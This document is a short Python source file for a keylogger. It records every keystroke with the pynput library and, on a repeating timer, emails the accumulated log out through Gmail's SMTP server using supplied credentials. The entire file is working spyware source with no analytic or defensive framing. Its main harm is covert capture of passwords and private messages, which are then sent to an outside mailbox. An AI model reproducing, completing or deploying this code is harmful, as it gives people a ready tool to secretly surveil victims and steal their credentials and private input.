import smtplib
import threading
from pynput import keyboard

class keylogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "[!] keylogger has started"
        self.email = email
        self.password = password  # Corregido aquí

    def appendTolog(self, string):
        self.log = self.log + string

    def onPress(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "  # Corregido aquí
            elif key == key.esc:
                print("[!] Exiting program")
                return False
            else:
                current_key = " " + str(key) + " "
        self.appendTolog(current_key)

    def sendMail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def reportAndSendEmail(self):
        self.sendMail(self.email, self.password, "\n\n" + self.log)
        self.log = " "
        timer = threading.Timer(self.interval, self.reportAndSendEmail)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboardListener = keyboard.Listener(on_press=self.onPress)
        with keyboardListener:
            self.reportAndSendEmail()
            keyboardListener.join()